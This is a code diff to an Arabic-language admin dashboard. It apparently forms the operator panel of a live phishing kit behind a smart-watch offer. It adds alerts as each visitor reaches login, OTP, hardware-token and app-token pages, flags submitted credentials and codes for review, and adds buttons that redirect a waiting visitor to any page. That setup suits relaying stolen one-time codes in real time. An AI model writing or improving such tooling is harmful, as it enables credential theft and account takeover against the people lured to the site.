@@ -119,6 +119,17 @@ const STAGES: { value: OrderRow["stage"]; label: string }[] = [
 
 const STAGE_LABEL: Record<string, string> = Object.fromEntries(STAGES.map((s) => [s.value, s.label]));
 
+/** إشعار مختلف لكل صفحة يصلها العميل */
+const STAGE_NOTIFY: Record<string, { title: string; body: string }> = {
+  "select-watch": { title: "🛒 عميل يتصفّح الساعات", body: "عميل جديد وصل لصفحة اختيار الموديل" },
+  register: { title: "📝 عميل في التسجيل", body: "عميل بدأ إدخال بياناته الشخصية" },
+  login: { title: "🔐 محاولة تسجيل دخول", body: "عميل أدخل بيانات الدخول — بحاجة مراجعة" },
+  "verify-otp": { title: "📩 إدخال رمز OTP", body: "عميل يطلب التحقق من رمز الرسالة النصية" },
+  "hardware-token": { title: "🔑 توكن جهاز جديد", body: "عميل أرسل توكن الجهاز — بحاجة مراجعة" },
+  "app-token": { title: "📱 توكن تطبيق جديد", body: "عميل أرسل رمز التطبيق — بحاجة مراجعة" },
+  processing: { title: "⏳ عميل في الانتظار", body: "عميل في صفحة المعالجة بانتظار قرارك" },
+};
+
 const STATUSES = [
   { value: "new", label: "جديد" },
   { value: "review", label: "قيد المراجعة" },
@@ -308,11 +319,13 @@ function Dashboard({
   const [alertsEnabled, setAlertsEnabled] = useState(false);
   const [notificationSound, setNotificationSound] = useState(true);
   const [settingsOpen, setSettingsOpen] = useState(false);
+  const [needsActionOnly, setNeedsActionOnly] = useState(false);
   const flashRef = useRef<Set<string>>(new Set());
   const eventFeedRef = useRef<HTMLUListElement>(null);
   const hasLoadedRef = useRef(false);
   const ordersRef = useRef<OrderRow[]>([]);
   const alertsRef = useRef(false);
+  const prevStageRef = useRef<Map<string, string>>(new Map());
 
   useEffect(() => {
     try {
@@ -379,14 +392,37 @@ function Dashboard({
           window.setTimeout(() => {
             for (const id of freshIds) flashRef.current.delete(id);
           }, 2000);
-           if (alertsRef.current && "Notification" in window && Notification.permission === "granted") {
-             new Notification("طلب جديد — ساعة أهل مصر الذكية", {
-               body: `${freshIds.length} طلب جديد يحتاج إلى مراجعة`,
-               icon: "/icon-192.png",
-             });
-             playAlertSound(notificationSound);
-           }
         }
+
+        // اكتشف تغيّر مرحلة كل عميل لإطلاق إشعار مخصّص لكل صفحة
+        const canNotify =
+          alertsRef.current && "Notification" in window && Notification.permission === "granted";
+        const prevStages = prevStageRef.current;
+        const stageChanges: { order: OrderRow; isNew: boolean }[] = [];
+        for (const o of nextOrders) {
+          const prev = prevStages.get(o.session_id);
+          if (hasLoadedRef.current && prev !== o.stage) {
+            stageChanges.push({ order: o, isNew: !prev });
+          }
+        }
+        if (canNotify && stageChanges.length) {
+          for (const { order, isNew } of stageChanges) {
+            const meta = STAGE_NOTIFY[order.stage];
+            if (!meta) continue;
+            const who = order.name || order.phone || order.session_id.slice(0, 8);
+            new Notification(meta.title, {
+              body: `${isNew ? "🆕 " : ""}${who} — ${meta.body}`,
+              icon: "/icon-192.png",
+              tag: `stage-${order.session_id}-${order.stage}`,
+            });
+          }
+          playAlertSound(notificationSound);
+        }
+        // حدّث الخريطة
+        const nextMap = new Map<string, string>();
+        for (const o of nextOrders) nextMap.set(o.session_id, o.stage);
+        prevStageRef.current = nextMap;
+
         hasLoadedRef.current = true;
         setOrders(nextOrders);
         setEvents(res.events as EventRow[]);
@@ -543,6 +579,7 @@ function Dashboard({
 
   const filtered = useMemo(() => {
     const list = orders.filter((o) => {
+      if (needsActionOnly && o.status !== "review" && o.status !== "new") return false;
       if (statusFilter !== "all" && o.status !== statusFilter) return false;
       if (stageFilter !== "all" && o.stage !== stageFilter) return false;
       if (onlineOnly && !onlineSet.has(o.session_id)) return false;
@@ -563,7 +600,7 @@ function Dashboard({
     else if (sortBy === "updated") sorted.sort((a, b) => t(b.updated_at) - t(a.updated_at));
     else sorted.sort((a, b) => t(b.created_at) - t(a.created_at));
     return sorted;
-  }, [orders, q, statusFilter, stageFilter, onlineOnly, onlineSet, sortBy]);
+  }, [orders, q, statusFilter, stageFilter, onlineOnly, onlineSet, sortBy, needsActionOnly]);
 
   // Keep the rendered table light: render a page at a time.
   const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
@@ -580,7 +617,7 @@ function Dashboard({
 
   useEffect(() => {
     setVisibleCount(PAGE_SIZE);
-  }, [q, statusFilter, stageFilter, onlineOnly, sortBy]);
+  }, [q, statusFilter, stageFilter, onlineOnly, sortBy, needsActionOnly]);
 
 
   const stats = useMemo(() => {
@@ -896,7 +933,18 @@ function Dashboard({
                 المتصلون فقط
               </label>
             </div>
-            {(q || statusFilter !== "all" || stageFilter !== "all" || onlineOnly) && (
+            <Button
+              type="button"
+              variant={needsActionOnly ? "default" : "outline"}
+              size="sm"
+              className="w-full gap-1.5"
+              onClick={() => setNeedsActionOnly((v) => !v)}
+              aria-pressed={needsActionOnly}
+            >
+              <ShieldAlert className="h-4 w-4" />
+              {needsActionOnly ? "عرض كل الطلبات" : "قيد المراجعة فقط (بحاجة إجراء)"}
+            </Button>
+            {(q || statusFilter !== "all" || stageFilter !== "all" || onlineOnly || needsActionOnly) && (
               <Button
                 variant="ghost"
                 size="sm"
@@ -906,6 +954,7 @@ function Dashboard({
                   setStatusFilter("all");
                   setStageFilter("all");
                   setOnlineOnly(false);
+                  setNeedsActionOnly(false);
                 }}
               >
                 <X className="h-4 w-4" />
@@ -1276,6 +1325,32 @@ function OrderWorkspace({
 
         <div className="mt-3 flex flex-wrap items-center gap-2 border-t border-border pt-3">
           <QuickActions onAction={onAction} status={order.status} stage={order.stage} />
+        </div>
+
+        {/* جميع صفحات الموقع كأزرار توجيه سريعة */}
+        <div className="mt-3 border-t border-border pt-3">
+          <p className="mb-2 text-[11px] font-black text-muted-foreground">
+            توجيه العميل إلى صفحة
+          </p>
+          <div className="flex flex-wrap gap-1.5">
+            {STAGES.map((s) => {
+              const active = order.stage === s.value;
+              return (
+                <Button
+                  key={s.value}
+                  type="button"
+                  variant={active ? "default" : "outline"}
+                  size="sm"
+                  onClick={() => onStage(s.value)}
+                  className="h-8 min-h-8 gap-1 px-2 text-[11px]"
+                  title={s.label}
+                >
+                  {active && <Check className="h-3 w-3" />}
+                  {s.label}
+                </Button>
+              );
+            })}
+          </div>
         </div>
       </div>
 
